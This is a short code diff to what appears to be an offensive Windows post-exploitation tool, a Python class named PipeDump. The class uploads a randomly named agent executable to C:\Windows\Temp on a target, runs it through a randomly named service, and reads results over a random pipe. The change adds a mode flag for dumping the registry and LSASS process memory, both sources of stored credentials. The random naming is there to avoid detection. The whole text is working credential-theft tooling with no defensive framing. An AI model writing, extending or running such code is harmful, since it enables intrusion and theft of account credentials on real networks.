@@ -52,13 +52,14 @@ class PipeDump:
         self.session = session
         self.agent_path = agent_path
 
-    def execute(self, lsass_pid: int = 0) -> AgentResult:
+    def execute(self, do_registry: bool = True, lsass_pid: int = 0) -> AgentResult:
         pipe_name = random_name(12)
         svc_name = random_name(10)
         agent_name = f"{random_name()}.exe"
 
+        mode = (1 if do_registry else 0) | (2 if lsass_pid > 0 else 0)
         self._upload_agent(agent_name)
-        binary_path = f"C:\\Windows\\Temp\\{agent_name} {lsass_pid} {pipe_name}"
+        binary_path = f"C:\\Windows\\Temp\\{agent_name} {mode} {lsass_pid} {pipe_name}"
 
         t = threading.Thread(target=self._exec_via_service, args=(svc_name, binary_path), daemon=True)
         t.start()
